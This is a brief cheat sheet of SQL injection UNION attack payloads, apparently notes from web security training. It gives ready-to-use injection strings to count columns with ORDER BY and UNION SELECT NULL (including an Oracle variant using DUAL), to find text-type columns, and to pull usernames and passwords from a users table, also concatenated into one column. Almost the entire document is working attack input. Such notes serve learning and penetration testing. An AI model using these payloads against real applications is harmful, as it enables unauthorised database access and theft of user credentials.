# Determining the number of columns required
1. Order By: ' ORDER BY 1--   (Max number)
2. Union Select: ' UNION SELECT NULL,NULL--

Note: In oracle we have to add the DB -> ' UNION SELECT NULL FROM DUAL--

# Finding columns with a useful data type
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

# Using a SQL injection UNION attack to retrieve interesting data
```
' UNION SELECT username, password FROM users--
```

# Retrieving multiple values within a single column
```
' UNION SELECT username || '~' || password FROM users--
```
